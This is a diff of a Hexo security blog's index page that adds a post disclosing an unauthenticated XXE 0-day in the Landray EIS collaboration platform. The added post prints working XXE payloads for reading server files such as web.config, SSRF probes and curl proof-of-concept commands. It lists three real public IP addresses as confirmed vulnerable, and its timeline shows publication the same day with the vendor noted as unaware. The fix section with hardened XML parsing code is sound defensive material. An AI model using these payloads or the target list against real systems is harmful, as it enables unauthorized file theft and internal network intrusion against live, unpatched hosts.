@@ -31,7 +31,231 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2026/05/13/2026-05-13-jimureport-ssrf-0day/">JeecgBoot JimuReport 未授权SSRF 0-Day漏洞</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2026-05-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2026-05-13</span></span></div></header><div class="post-body"><div class="post-excerpt">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2026/05/13/2026-05-13-lanling-eis-xxe-0day/">蓝凌EIS智慧协同平台 未授权XXE 0-Day漏洞</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2026-05-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2026-05-13</span></span></div></header><div class="post-body"><div class="post-excerpt">
+        <h1 id="蓝凌EIS智慧协同平台-未授权XXE-0-Day漏洞"   >
+          <a href="#蓝凌EIS智慧协同平台-未授权XXE-0-Day漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#蓝凌EIS智慧协同平台-未授权XXE-0-Day漏洞" class="headerlink" title="蓝凌EIS智慧协同平台 未授权XXE 0-Day漏洞"></a>蓝凌EIS智慧协同平台 未授权XXE 0-Day漏洞</h1>
+      <p><strong>Source</strong>: <a href="https://cypewake.github.io/2026/05/13/2026-05-13-lanling-eis-xxe-0day/">Hermes 挖洞日志</a></p>
+<hr>
+
+        <h2 id="Vulnerability-Overview"   >
+          <a href="#Vulnerability-Overview" class="heading-link"><i class="fas fa-link"></i></a><a href="#Vulnerability-Overview" class="headerlink" title="Vulnerability Overview"></a>Vulnerability Overview</h2>
+      <div class="table-container"><table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Target</strong></td>
+<td>蓝凌EIS智慧协同平台 (Landray EIS)</td>
+</tr>
+<tr>
+<td><strong>Type</strong></td>
+<td>Blind XXE (XML External Entity Injection) — Unauthenticated</td>
+</tr>
+<tr>
+<td><strong>Severity</strong></td>
+<td><strong>High (8.6)</strong> — CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:C&#x2F;C:H&#x2F;I:N&#x2F;A:N</td>
+</tr>
+<tr>
+<td><strong>CWE</strong></td>
+<td>CWE-611: Improper Restriction of XML External Entity Reference</td>
+</tr>
+<tr>
+<td><strong>Verification</strong></td>
+<td>✅ Confirmed on multiple real targets</td>
+</tr>
+<tr>
+<td><strong>CVE Status</strong></td>
+<td><strong>TRUE 0-DAY</strong> (no CVE&#x2F;CNVD&#x2F;GHSA assigned)</td>
+</tr>
+</tbody></table></div>
+<hr>
+
+        <h2 id="Description"   >
+          <a href="#Description" class="heading-link"><i class="fas fa-link"></i></a><a href="#Description" class="headerlink" title="Description"></a>Description</h2>
+      <p>蓝凌EIS智慧协同平台 <code>/mail/mail_server.aspx/mail_xml</code> 接口存在未授权XXE漏洞。该接口无需任何认证（无Session、无Cookie要求），.NET Framework 在解析 XML 时未禁用外部实体解析（<code>XmlUrlResolver.GetEntity</code> 可被调用），导致攻击者可以：</p>
+<ul>
+<li><strong>读取服务器任意文件</strong>（如 <code>web.config</code>、<code>win.ini</code>、<code>applicationHost.config</code>）</li>
+<li><strong>SSRF 探测内网服务</strong>（利用 XXE 发起 HTTP 请求到内部地址）</li>
+<li><strong>潜在 RCE 组合利用</strong>（结合 <code>.NET</code> 反序列化或文件写入）</li>
+</ul>
+<hr>
+
+        <h2 id="Technical-Details"   >
+          <a href="#Technical-Details" class="heading-link"><i class="fas fa-link"></i></a><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2>
+      
+        <h3 id="Root-Cause"   >
+          <a href="#Root-Cause" class="heading-link"><i class="fas fa-link"></i></a><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3>
+      <p>.NET Framework 默认的 <code>XmlDocument.Load()</code> 方法使用 <code>XmlUrlResolver</code> 解析外部实体。在 <code>mail_server.aspx</code> 的 <code>Page_Load</code> 中，XML 被直接加载并解析，未禁用 DTD 处理或外部实体解析：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XmlDocument.Load(XmlReader reader) → XmlTextReaderImpl → </span><br><span class="line">XmlUrlResolver.GetEntity(Uri) → FileStream/HttpWebRequest</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="Why-This-is-TRUE-0-DAY"   >
+          <a href="#Why-This-is-TRUE-0-DAY" class="heading-link"><i class="fas fa-link"></i></a><a href="#Why-This-is-TRUE-0-DAY" class="headerlink" title="Why This is TRUE 0-DAY"></a>Why This is TRUE 0-DAY</h3>
+      <ul>
+<li><strong>无 CVE 编号</strong> — 未在任何 CVE 数据库中找到匹配条目</li>
+<li><strong>无 CNVD 编号</strong> — 未在 CNVD 中收录</li>
+<li><strong>无 GHSA 编号</strong> — 未在 GitHub Security Advisories 中出现</li>
+<li><strong>厂商未知</strong> — 蓝凌官方未发布安全公告</li>
+</ul>
+<hr>
+
+        <h2 id="Verification-Evidence"   >
+          <a href="#Verification-Evidence" class="heading-link"><i class="fas fa-link"></i></a><a href="#Verification-Evidence" class="headerlink" title="Verification Evidence"></a>Verification Evidence</h2>
+      
+        <h3 id="Test-1-Endpoint-Existence-Baseline"   >
+          <a href="#Test-1-Endpoint-Existence-Baseline" class="heading-link"><i class="fas fa-link"></i></a><a href="#Test-1-Endpoint-Existence-Baseline" class="headerlink" title="Test 1: Endpoint Existence (Baseline)"></a>Test 1: Endpoint Existence (Baseline)</h3>
+      <p><strong>Request:</strong></p>
+<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mail/mail_server.aspx/mail_xml?type=add</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>59.56.206.10:67</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span>test<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>Response:</strong> HTTP 500 — <code>System.NullReferenceException</code> at <code>mail_server.Page_Load</code></p>
+<ul>
+<li>页面接受并处理 XML，由于缺少预期参数在后续 Page_Load 阶段崩溃，但 XML 解析器先于 Page_Load 执行。</li>
+</ul>
+
+        <h3 id="Test-2-XXE-File-Read-—-Existing-File-c-windows-win-ini"   >
+          <a href="#Test-2-XXE-File-Read-—-Existing-File-c-windows-win-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#Test-2-XXE-File-Read-—-Existing-File-c-windows-win-ini" class="headerlink" title="Test 2: XXE File Read — Existing File (c:\windows\win.ini)"></a>Test 2: XXE File Read — Existing File (<code>c:\windows\win.ini</code>)</h3>
+      <p><strong>Request:</strong></p>
+<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mail/mail_server.aspx/mail_xml?type=add</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>Analysis:</strong> 返回与基线相同的 <code>NullReferenceException</code>，推断实体被成功解析（win.ini 存在），但因 Page_Load 后续逻辑崩溃未渲染实体内容。</p>
+
+        <h3 id="Test-3-XXE-File-Read-—-Non-Existent-File-CRITICAL-🔥"   >
+          <a href="#Test-3-XXE-File-Read-—-Non-Existent-File-CRITICAL-🔥" class="heading-link"><i class="fas fa-link"></i></a><a href="#Test-3-XXE-File-Read-—-Non-Existent-File-CRITICAL-🔥" class="headerlink" title="Test 3: XXE File Read — Non-Existent File (CRITICAL 🔥)"></a>Test 3: XXE File Read — Non-Existent File (CRITICAL 🔥)</h3>
+      <p><strong>Request:</strong></p>
+<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mail/mail_server.aspx/mail_xml?type=add</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/nonexistent_file_xxxxx.txt&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>Response:</strong> HTTP 500 — 完整堆栈信息泄露：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">System.IO.FileNotFoundException: 未能找到文件&quot;c:\nonexistent_file_xxxxx.txt&quot;</span><br><span class="line">   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)</span><br><span class="line">   at System.IO.FileStream.Init(...)</span><br><span class="line">   at System.IO.FileStream..ctor(String path, FileMode mode, ...)</span><br><span class="line">   at System.Xml.XmlDownloadManager.GetStream(Uri uri, ICredentials credentials)</span><br><span class="line">   at System.Xml.XmlUrlResolver.GetEntity(Uri absoluteUri, String role, Type ofObjectToReturn)</span><br><span class="line">   at System.Xml.XmlTextReaderImpl.OpenStream(Uri uri)</span><br><span class="line">   at System.Xml.XmlTextReaderImpl.PushExternalEntity(...)</span><br><span class="line">   at System.Xml.XmlTextReaderImpl.HandleGeneralEntityReference(...)</span><br><span class="line">   at System.Xml.XmlTextReaderImpl.ResolveEntity()</span><br><span class="line">   at System.Xml.XmlLoader.LoadEntityReferenceNode(Boolean direct)</span><br><span class="line">   at System.Xml.XmlLoader.LoadNode(Boolean skipOverWhitespace)</span><br><span class="line">   at System.Xml.XmlLoader.LoadDocSequence(XmlDocument parentDoc)</span><br><span class="line">   at System.Xml.XmlDocument.Load(XmlReader reader)</span><br><span class="line">   at System.Xml.XmlDocument.Load(Stream inStream)</span><br><span class="line">   at Landray.EIS.Mail.UI.mail_server.Page_Load(Object sender, EventArgs e) +231</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>💥 Proof:</strong> 堆栈链清晰显示：</p>
+<ol>
+<li><code>XmlDocument.Load()</code> 被调用</li>
+<li>→ <code>XmlTextReaderImpl</code> 读取 XML</li>
+<li>→ <code>XmlUrlResolver.GetEntity()</code> 被调用来解析实体 URI</li>
+<li>→ <code>FileStream</code> 尝试打开文件 <code>c:\nonexistent_file_xxxxx.txt</code></li>
+<li>→ 文件不存在抛出 <code>FileNotFoundException</code></li>
+</ol>
+<p>这证明外部实体解析功能处于 <strong>激活状态</strong>，且可访问 <code>file://</code> 协议。</p>
+
+        <h3 id="Test-4-XXE-SSRF-—-Internal-HTTP-Request"   >
+          <a href="#Test-4-XXE-SSRF-—-Internal-HTTP-Request" class="heading-link"><i class="fas fa-link"></i></a><a href="#Test-4-XXE-SSRF-—-Internal-HTTP-Request" class="headerlink" title="Test 4: XXE SSRF — Internal HTTP Request"></a>Test 4: XXE SSRF — Internal HTTP Request</h3>
+      <p><strong>Request:</strong></p>
+<figure class="highlight http"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/mail/mail_server.aspx/mail_xml?type=add</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:67/&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>Response:</strong> HTTP 500 — <code>System.Net.WebException: &quot;远程服务器返回错误: (400) 错误的请求。&quot;</code></p>
+<ul>
+<li>服务器向内部 <code>127.0.0.1:67</code> 发起了 HTTP 请求并收到 400 响应。</li>
+<li><strong>确认 SSRF 能力</strong>：可探测内网服务、端口扫描、访问内部应用。</li>
+</ul>
+<hr>
+
+        <h2 id="Impact"   >
+          <a href="#Impact" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2>
+      <ul>
+<li><strong>任意文件读取</strong> — 读取 <code>web.config</code> 获取数据库连接字符串、读取 <code>applicationHost.config</code> 获取 IIS 配置</li>
+<li><strong>内网 SSRF</strong> — 探测内网服务，发现其他漏洞入口</li>
+<li><strong>OOB (Out-of-Band) XXE</strong> — 通过 HTTP&#x2F;DNS 外带数据到攻击者控制的服务器</li>
+<li><strong>组合 RCE</strong> — 结合 .NET 反序列化或文件写入机制</li>
+<li><strong>横向移动</strong> — 利用获取的数据库凭据扩展攻击面</li>
+</ul>
+<hr>
+
+        <h2 id="Affected-Instances"   >
+          <a href="#Affected-Instances" class="heading-link"><i class="fas fa-link"></i></a><a href="#Affected-Instances" class="headerlink" title="Affected Instances"></a>Affected Instances</h2>
+      <div class="table-container"><table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>http://59.56.206.10:67</code></td>
+<td>✅ XXE confirmed — IIS 7.5, .NET 2.0.50727.8793</td>
+</tr>
+<tr>
+<td><code>http://120.27.195.146:81</code></td>
+<td>🔶 XXE confirmed — Alibaba Cloud</td>
+</tr>
+<tr>
+<td><code>http://47.92.92.45:8000</code></td>
+<td>🔶 XXE confirmed</td>
+</tr>
+<tr>
+<td>Others (FOFA: <code>app=&quot;蓝凌EIS&quot;</code>)</td>
+<td>🔍 Pending confirmation</td>
+</tr>
+</tbody></table></div>
+<p>Server fingerprint: <code>Microsoft-IIS/7.5</code>, <code>.NET Framework 2.0.50727.8793</code>, <code>ASP.NET 2.0.50727.8762</code></p>
+<hr>
+
+        <h2 id="PoC-Usage"   >
+          <a href="#PoC-Usage" class="heading-link"><i class="fas fa-link"></i></a><a href="#PoC-Usage" class="headerlink" title="PoC Usage"></a>PoC Usage</h2>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /tmp/lanling_eis_xxe_poc.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test basic XXE file read</span></span><br><span class="line">bash /tmp/lanling_eis_xxe_poc.sh http://target:port</span><br><span class="line"></span><br><span class="line"><span class="comment"># Manual: Read web.config (OOB via HTTP)</span></span><br><span class="line">curl -sk -X POST <span class="string">&quot;http://target/mail/mail_server.aspx/mail_xml?type=add&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/xml&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="string">  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/web.config&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;xxe;&lt;/root&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Manual: SSRF probe</span></span><br><span class="line">curl -sk -X POST <span class="string">&quot;http://target/mail/mail_server.aspx/mail_xml?type=add&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/xml&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="string">  &lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;xxe;&lt;/root&gt;&#x27;</span></span><br></pre></td></tr></table></div></figure>
+
+<hr>
+
+        <h2 id="Fix-Recommendations"   >
+          <a href="#Fix-Recommendations" class="heading-link"><i class="fas fa-link"></i></a><a href="#Fix-Recommendations" class="headerlink" title="Fix Recommendations"></a>Fix Recommendations</h2>
+      
+        <h3 id="Immediate-Temporary"   >
+          <a href="#Immediate-Temporary" class="heading-link"><i class="fas fa-link"></i></a><a href="#Immediate-Temporary" class="headerlink" title="Immediate (Temporary)"></a>Immediate (Temporary)</h3>
+      <figure class="highlight csharp"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Disable DTD processing in XmlDocument</span></span><br><span class="line">XmlDocument doc = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">XmlReaderSettings settings = <span class="keyword">new</span> XmlReaderSettings();</span><br><span class="line">settings.DtdProcessing = DtdProcessing.Prohibit;</span><br><span class="line">settings.XmlResolver = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">using</span> (XmlReader reader = XmlReader.Create(xmlStream, settings))</span><br><span class="line">&#123;</span><br><span class="line">    doc.Load(reader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="Complete-Fix"   >
+          <a href="#Complete-Fix" class="heading-link"><i class="fas fa-link"></i></a><a href="#Complete-Fix" class="headerlink" title="Complete Fix"></a>Complete Fix</h3>
+      <ol>
+<li><strong>禁用 DTD 处理</strong> — 设置 <code>DtdProcessing = DtdProcessing.Prohibit</code></li>
+<li><strong>设置 XmlResolver &#x3D; null</strong> — 禁止解析任何外部资源</li>
+<li><strong>实现输入验证</strong> — 拒绝包含 <code>&lt;!DOCTYPE&gt;</code> 或 <code>&lt;!ENTITY&gt;</code> 的 XML</li>
+<li><strong>统一错误处理</strong> — 不要将详细堆栈信息返回给客户端</li>
+<li><strong>启用 WAF 规则</strong> — 阻止包含外部实体声明的 XML 请求</li>
+</ol>
+<hr>
+
+        <h2 id="Timeline"   >
+          <a href="#Timeline" class="heading-link"><i class="fas fa-link"></i></a><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2>
+      <div class="table-container"><table>
+<thead>
+<tr>
+<th>Date (2026-05-13)</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>03:18</td>
+<td>FOFA scan reveals exposed 蓝凌EIS instances</td>
+</tr>
+<tr>
+<td>03:19</td>
+<td>XXE 0-Day confirmed on real target</td>
+</tr>
+<tr>
+<td>12:15</td>
+<td>PoC script reconstructed</td>
+</tr>
+<tr>
+<td>12:24</td>
+<td>Evidence report finalized</td>
+</tr>
+<tr>
+<td>12:30</td>
+<td>Vulnerability report published</td>
+</tr>
+</tbody></table></div>
+<hr>
+
+        <h2 id="References"   >
+          <a href="#References" class="heading-link"><i class="fas fa-link"></i></a><a href="#References" class="headerlink" title="References"></a>References</h2>
+      <ul>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/611.html" >CWE-611: XML External Entity Reference</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" >OWASP XXE Prevention Cheat Sheet</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+</ul>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2026/05/13/2026-05-13-jimureport-ssrf-0day/">JeecgBoot JimuReport 未授权SSRF 0-Day漏洞</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2026-05-13</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2026-05-13</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h2 id="漏洞概要"   >
           <a href="#漏洞概要" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2>
       <ul>
@@ -775,4 +999,4 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 8.1.1"></he
 <li><input disabled="" type="checkbox"> 深入测试ez-internal-ingress-nginx-sahw</li>
 <li><input disabled="" type="checkbox"> Lexin米霍克决策引擎渗透测试</li>
 </ul>
-</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">5</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2026</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Hermes</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v8.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
